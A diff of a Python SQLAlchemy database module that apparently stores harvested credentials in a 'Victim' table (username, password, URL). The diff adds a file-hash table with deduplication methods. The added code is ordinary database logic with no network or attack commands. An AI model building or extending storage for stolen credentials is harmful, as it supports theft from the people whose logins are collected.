@@ -20,6 +20,12 @@ class Victim(Base):
     def __repr__(self) -> str:
         return f"{self.username}, {self.password}, {self.url}"
 
+
+class Files(Base):
+    __tablename__ = 'files'
+    hash = Column(String, primary_key=True)
+    name = Column(String)
+
 class DB:
     def __init__(self, db_str) -> None:
         self.engine = create_engine(db_str)
@@ -51,3 +57,20 @@ class DB:
         session.close()
         return count
   
+    def check_hash(self, hash):
+        session = self.Session()
+        exists = session.query(Files).filter_by(hash=hash).first() is not None
+        if exists:
+            return True
+        return False
+
+    def insert_hash(self, hash: str, name: str):
+        session = self.Session()
+        exists = session.query(Files).filter_by(hash=hash).first() is not None
+        if not exists:
+            session.add(Files(name=name, hash=hash))
+            session.commit()
+            session.close()
+            return True
+        session.close()
+        return False
